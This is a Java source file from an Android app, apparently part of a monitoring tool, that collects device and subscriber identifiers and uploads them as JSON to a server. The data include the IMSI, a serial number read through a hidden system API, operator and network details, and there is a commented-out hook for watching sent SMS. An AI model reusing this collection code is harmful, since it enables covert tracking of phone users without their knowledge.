package com.inet.android.info;

import java.lang.reflect.Method;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import com.inet.android.request.DataRequest;
import com.inet.android.sms.SmsSentObserver;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public class GetInfo {
	static Context mContext;
	static SharedPreferences sp;
	static Editor e;
	static TelephonyManager telephonyManager;
	static int networkType;
	TelephonyInfo telephonyInfo;
	private String LOG_TAG = "GetIfo";
	String typeStr = "1";
	ConvertDate date;

	public GetInfo(Context mContext) {
		GetInfo.mContext = mContext;
	}

	public void getInfo() {
		date = new ConvertDate();
		contentObserved();
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		telephonyManager = (TelephonyManager) mContext
				.getSystemService(Context.TELEPHONY_SERVICE);
		telephonyInfo = TelephonyInfo.getInstance(mContext);

		// -------initial json line----------------------
		String sendJSONStr = null;
		JSONObject jsonObject = new JSONObject();
		JSONArray data = new JSONArray();
		JSONObject info = new JSONObject();
		JSONObject object = new JSONObject();
		try {

			info.put("brand", getBrand());
			info.put("model", getModel());
			info.put("imsi", getIMSI());
			info.put("serial_number", getSerialNum());
			info.put("manufactured", getManufactured());
			info.put("product", getProduct());
			info.put("os_version", getVerAndroid());
			info.put("sdk", getSDK());

			info.put("is_dual_sim", getIsDualSIM());
			info.put("imei_sim1", getIsSIM1Ready());
			info.put("imei_sim2", getIsSIM2Ready());
			info.put("mcc", getMCC());
			info.put("mnc", getMNC());
			info.put("phone_type", getPhoneType());
			info.put("network_type", getNetworkType());
			info.put("network", getConnectType());
			info.put("operator_name", getOperatorName());
			info.put("screen_size", getDisplayInfo());
			info.put("ver_app", sp.getString("BUILD", "V_000.1"));

			object.put("time", date.logTime());
			object.put("type", typeStr);
			object.put("info", info);
			data.put(object);
			jsonObject.put("data", data);
			sendJSONStr = object.toString();
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
		}
		if (sendJSONStr != null) {
			DataRequest dr = new DataRequest(mContext);
			dr.sendRequest(object.toString());
			Logging.doLog(LOG_TAG, sendJSONStr);
		}
	}

	/**
	 * get getSimOperatorName
	 * 
	 * @return
	 */
	public String getSimOperatorName() {
		String operatorName;
		try {
			operatorName = telephonyManager.getSimOperatorName();
			operatorName = " brand: " + operatorName;
		} catch (Exception e) {
			e.printStackTrace();
			operatorName = "0";
		}
		return operatorName;
	}

	/**
	 * get getBrand
	 * 
	 * @return
	 */
	public String getBrand() {
		String brand;
		try {
			String brandPhone = android.os.Build.BRAND;
			brand = " Brand: " + brandPhone;
		} catch (Exception e) {
			e.printStackTrace();
			brand = "0";
		}
		return brand;
	}

	/**
	 * get getSDK
	 * 
	 * @return
	 */
	public String getSDK() {
		String SDK;
		try {
			int sdk_int = android.os.Build.VERSION.SDK_INT;
			SDK = " SDK: " + Integer.toString(sdk_int);
		} catch (Exception e) {
			e.printStackTrace();
			SDK = "0";
		}
		return SDK;
	}

	/**
	 * get getOperatorName
	 * 
	 * @return
	 */
	public String getOperatorName() {
		String operatorName = null;
		try {
			String carrierName = telephonyManager.getNetworkOperatorName();
			operatorName = " operatorName: " + carrierName;
		} catch (Exception e) {
			e.printStackTrace();
			operatorName = "0";
		}
		return operatorName;
	}

	/**
	 * getIMEI
	 * 
	 * @return
	 */

	public String getIMEI() {
		String sIMEI = null;
		try {
			String imeistring = telephonyManager.getDeviceId();
			sIMEI = " IMEI: " + imeistring;
		} catch (Exception e) {
			e.printStackTrace();
			sIMEI = "0";
		}
		return sIMEI;

	}

	/**
	 * getIMSI
	 * 
	 * @return
	 */

	public String getIMSI() {
		String sIMSI = null;
		try {
			String IMSI = telephonyManager.getSubscriberId();
			sIMSI = " IMSI: " + IMSI;
		} catch (Exception e) {
			e.printStackTrace();
			sIMSI = "0";
		}
		return sIMSI;

	}

	/**
	 * getVersion Android
	 * 
	 * @return
	 */
	public String getVerAndroid() {
		String verAndroid = null;
		try {
			String versionAndroid = android.os.Build.VERSION.RELEASE;
			verAndroid = " Version android: " + versionAndroid;
		} catch (Exception e) {
			e.printStackTrace();
			verAndroid = "0";
		}
		return verAndroid;

	}

	/**
	 * getManufactured
	 * 
	 * @return
	 */

	public String getManufactured() {
		String manufactured = null;
		try {
			String manufacturedPhone = android.os.Build.MANUFACTURER;
			manufactured = " Manufactured: " + manufacturedPhone;
		} catch (Exception e) {
			e.printStackTrace();
			manufactured = "0";
		}
		return manufactured;

	}

	/**
	 * getProduct
	 * 
	 * @return
	 */
	public String getProduct() {
		String product = null;
		try {
			String productPhone = android.os.Build.PRODUCT;
			product = " Product: " + productPhone;
		} catch (Exception e) {
			e.printStackTrace();
			product = "0";
		}
		return product;

	}

	/**
	 * getModel
	 * 
	 * @return
	 */
	public String getModel() {
		String model = null;
		try {
			String modelPhone = android.os.Build.MODEL;
			model = " Model: " + modelPhone;
		} catch (Exception e) {
			e.printStackTrace();
			model = "0";
		}
		return model;

	}

	/**
	 * getSerialNumber
	 * 
	 * @return
	 */
	public String getSerialNum() {
		String serialnum = null;

		try {
			Class<?> c = Class.forName("android.os.SystemProperties");
			Method get = c.getMethod("get", String.class, String.class);
			serialnum = (String) (get.invoke(c, "ro.serialno", "unknown"));
		} catch (Exception e) {
			e.printStackTrace();
		}
		return "SerialNum: " + serialnum;
	}

	/**
	 * get PhoneType
	 * 
	 * @return
	 */
	public String getPhoneType() {
		int phoneType = telephonyManager.getPhoneType();
		String phoneTypeName = null;
		switch (phoneType) {
		case (TelephonyManager.PHONE_TYPE_CDMA):
			phoneTypeName = "PHONE_TYPE_CDMA";
			break;
		case (TelephonyManager.PHONE_TYPE_GSM):
			phoneTypeName = "PHONE_TYPE_GSM";
			break;
		case (TelephonyManager.PHONE_TYPE_NONE):
			phoneTypeName = "PHONE_TYPE_NONE";
			break;
		default:
			break;
		}
		return "phoneType: " + phoneTypeName;
	}

	/**
	 * get NetworkType
	 * 
	 * @return
	 */
	public String getNetworkType() {
		networkType = telephonyManager.getNetworkType();
		switch (networkType) {
		case TelephonyManager.NETWORK_TYPE_1xRTT:
			return " networktype: " + "1xRTT";
		case TelephonyManager.NETWORK_TYPE_CDMA:
			return " networktype: " + "CDMA";
		case TelephonyManager.NETWORK_TYPE_EDGE:
			return " networktype: " + "EDGE";
		case TelephonyManager.NETWORK_TYPE_EHRPD:
			return " networktype: " + "eHRPD";
		case TelephonyManager.NETWORK_TYPE_EVDO_0:
			return " networktype: " + "EVDO rev. 0";
		case TelephonyManager.NETWORK_TYPE_EVDO_A:
			return " networktype: " + "EVDO rev. A";
		case TelephonyManager.NETWORK_TYPE_EVDO_B:
			return " networktype: " + "EVDO rev. B";
		case TelephonyManager.NETWORK_TYPE_GPRS:
			return " networktype: " + "GPRS";
		case TelephonyManager.NETWORK_TYPE_HSDPA:
			return " networktype: " + "HSDPA";
		case TelephonyManager.NETWORK_TYPE_HSPA:
			return " networktype: " + "HSPA";
		case TelephonyManager.NETWORK_TYPE_HSPAP:
			return " networktype: " + "HSPA+";
		case TelephonyManager.NETWORK_TYPE_HSUPA:
			return " networktype: " + "HSUPA";
		case TelephonyManager.NETWORK_TYPE_IDEN:
			return " networktype: " + "iDen";
		case TelephonyManager.NETWORK_TYPE_LTE:
			return " networktype: " + "LTE";
		case TelephonyManager.NETWORK_TYPE_UMTS:
			return " networktype: " + "UMTS";
		case TelephonyManager.NETWORK_TYPE_UNKNOWN:
			return "0";
		}
		throw new RuntimeException("New type of network");
	}

	/**
	 * getConnectType
	 * 
	 * @return
	 */
	public String getConnectType() {

		String network = "";
		ConnectivityManager cm = (ConnectivityManager) mContext
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		try {
			if (cm.getActiveNetworkInfo().getTypeName().equals("MOBILE"))
				network = "Cell Network/3G";
			else if (cm.getActiveNetworkInfo().getTypeName().equals("WIFI"))
				network = "WiFi";
			else
				network = "N/A";
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "network: " + network;
	}

	/**
	 * getIMEISim1
	 * 
	 * @return
	 */

	public String getIMEISim1() {
		String sIMEISim1 = null;
		try {
			String imeiSIM1 = telephonyInfo.getImeiSIM1();
			sIMEISim1 = " IMEI Sim1: " + imeiSIM1;
		} catch (Exception e) {
			e.printStackTrace();
			sIMEISim1 = "0";
		}
		return sIMEISim1;

	}

	/**
	 * getIMEISim2
	 * 
	 * @return
	 */

	public String getIMEISim2() {
		String sIMEISim2 = null;
		try {
			String imeiSIM2 = telephonyInfo.getImeiSIM2();
			sIMEISim2 = " IMEI Sim2: " + imeiSIM2;
		} catch (Exception e) {
			e.printStackTrace();
			sIMEISim2 = "0";
		}
		return sIMEISim2;
	}

	/**
	 * getIMEISim1Ready
	 * 
	 * @return
	 */
	public String getIsSIM1Ready() {
		String sIMEISim1Ready = null;
		try {
			boolean isSIM1Ready = telephonyInfo.isSIM1Ready();
			sIMEISim1Ready = " IMEI Sim1 Ready: " + isSIM1Ready;
		} catch (Exception e) {
			e.printStackTrace();
			sIMEISim1Ready = "0";
		}
		return sIMEISim1Ready;

	}

	/**
	 * getIMEISim2Ready
	 * 
	 * @return
	 */
	public String getIsSIM2Ready() {
		String sIMEISim2Ready = null;
		try {
			boolean isSIM2Ready = telephonyInfo.isSIM2Ready();
			sIMEISim2Ready = " IMEI Sim2 Ready: " + isSIM2Ready;
		} catch (Exception e) {
			e.printStackTrace();
			sIMEISim2Ready = "0";
		}
		return sIMEISim2Ready;

	}

	/**
	 * getIsDualSim
	 * 
	 * @return
	 */
	public String getIsDualSIM() {
		String sIsDualSim = null;
		try {
			boolean isDualSIM = telephonyInfo.isDualSIM();
			sIsDualSim = " isDualSim: " + isDualSIM;
		} catch (Exception e) {
			e.printStackTrace();
			sIsDualSim = "0";
		}
		return sIsDualSim;

	}

	/**
	 * getMCC
	 * 
	 * @return
	 */
	public String getMCC() {
		String networkOperator = telephonyManager.getNetworkOperator();
		String mcc = null;
		try {
			if (networkOperator != null) {
				mcc = "MCC: " + networkOperator.substring(0, 3);

			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return mcc;

	}

	/**
	 * getMCC
	 * 
	 * @return
	 */
	public String getMNC() {
		String networkOperator = telephonyManager.getNetworkOperator();
		String mnc = null;
		try {
			if (networkOperator != null) {
				mnc = "MNC: " + networkOperator.substring(3);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return mnc;

	}

	/**
	 * getDisplayMetrics w*h
	 * 
	 * @return
	 */
	public String getDisplayInfo() {
		WindowManager wm = (WindowManager) mContext
				.getSystemService(Context.WINDOW_SERVICE);
		// Best way for new devices
		DisplayMetrics displayMetrics = new DisplayMetrics();
		wm.getDefaultDisplay().getMetrics(displayMetrics);
		String str_ScreenSize = "Screen Size : " + displayMetrics.widthPixels
				+ " x " + displayMetrics.heightPixels;
		return str_ScreenSize;
	}

	public void contentObserved() {
//		SmsSentObserver content = new SmsSentObserver(new Handler(), null);
//		mContext.getContentResolver().registerContentObserver(
//				Uri.parse("content://sms/sent"), true, null);
	}
}
